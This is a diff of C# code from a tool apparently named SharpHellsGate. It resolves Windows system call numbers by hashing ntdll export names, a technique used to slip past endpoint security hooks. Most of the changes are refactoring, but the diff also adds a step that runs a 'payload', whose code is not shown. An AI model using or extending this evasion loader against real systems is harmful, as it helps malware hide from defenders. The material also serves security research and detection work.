@@ -1,10 +1,8 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using System.Reflection;
-using System.Reflection.Metadata.Ecma335;
 
 namespace SharpHellsGate {
 
@@ -66,7 +64,7 @@ namespace SharpHellsGate {
             List<Win32.IMAGE_SECTION_HEADER> ImageSectionHeaders = new List<Win32.IMAGE_SECTION_HEADER>(ImageNTHeaders.FileHeader.NumberOfSections);
             for (int cx = 0; cx < ImageNTHeaders.FileHeader.NumberOfSections; cx++) {
                 long iSectionOffset = GetSectionOffset(ImageDOSHeader.e_lfanew, ImageNTHeaders.FileHeader.SizeOfOptionalHeader, cx);
-                
+
                 ImageSection = MemUtil.GetStructureFromBlob<Win32.IMAGE_SECTION_HEADER>(iSectionOffset);
                 if (!ImageSection.Equals(default(Win32.IMAGE_SECTION_HEADER))) {
                     ImageSectionHeaders.Add(ImageSection);
@@ -103,24 +101,11 @@ namespace SharpHellsGate {
 
             Table.NtWaitForSingleObject.Hash = 0xc6a2fa174e551bcb;
             GetVxTableEntry(ref MemUtil, ref Table.NtWaitForSingleObject, ref ImageSectionHeaders, PtrToFunctions, PtrToFunctionNames, ImageExportDirectory.NumberOfNames);
-            LogInfo($"NtWaitForSingleObject:   0x{HighLowToSystemCall(Table.NtWaitForSingleObject):x4}");
+            LogInfo($"NtWaitForSingleObject:   0x{HighLowToSystemCall(Table.NtWaitForSingleObject):x4}\n");
 
-#if DEBUG
-            Console.ReadKey();
-#endif
-        }
-
-        private static void LogMessage(string msg, string prefix, int indent, ConsoleColor color) {
-            // Indent
-            Console.Write(new String(' ', indent));
-
-            // Color and prefix
-            Console.ForegroundColor = color;
-            Console.Write(prefix);
-            Console.ResetColor();
-
-            // Message
-            Console.WriteLine($" {msg}");
+            // Execute payload
+            HellsGate gate = new HellsGate(Table);
+            gate.Payload();
         }
 
         public static void LogInfo(string msg, int indent = 0, string prefix = "[>]") {
@@ -199,6 +184,19 @@ namespace SharpHellsGate {
                 hash = ((hash << 0x5) + hash) + (byte)c;
 
             return hash;
+        }
+
+        private static void LogMessage(string msg, string prefix, int indent, ConsoleColor color) {
+            // Indent
+            Console.Write(new String(' ', indent));
+
+            // Color and prefix
+            Console.ForegroundColor = color;
+            Console.Write(prefix);
+            Console.ResetColor();
+
+            // Message
+            Console.WriteLine($" {msg}");
         }
     }
 }
